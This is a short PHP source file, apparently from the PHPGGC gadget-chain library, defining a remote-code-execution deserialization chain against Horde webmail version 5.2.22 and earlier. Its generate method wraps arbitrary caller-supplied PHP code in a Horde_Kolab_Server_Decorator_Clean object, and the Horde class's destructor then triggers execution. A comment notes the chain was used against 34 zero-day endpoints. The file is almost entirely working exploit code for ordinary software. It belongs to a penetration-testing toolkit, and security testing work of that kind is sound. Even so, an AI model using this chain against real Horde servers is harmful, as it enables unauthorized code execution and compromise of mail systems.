<?php

namespace GadgetChain\Horde;

class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '<= 5.2.22';
    public static $vector = '__destruct';
    public static $foundby = 'EgiX';
    public static $author = 'mr_me';
    public static $information = '
        This chain was used against 34 different 0day endpoints targeting Horde v5.2.22. Other versions are probably affected
        See https://srcincite.io/blog/2020/08/19/a-smorgashorde-of-vulnerabilities-a-comparative-analysis-of-discovery.html
    ';

    public function generate(array $parameters)
    {
	    $code = $parameters['code'] . ';die;';
        return new \Horde_Kolab_Server_Decorator_Clean($code);
    }
}
?>
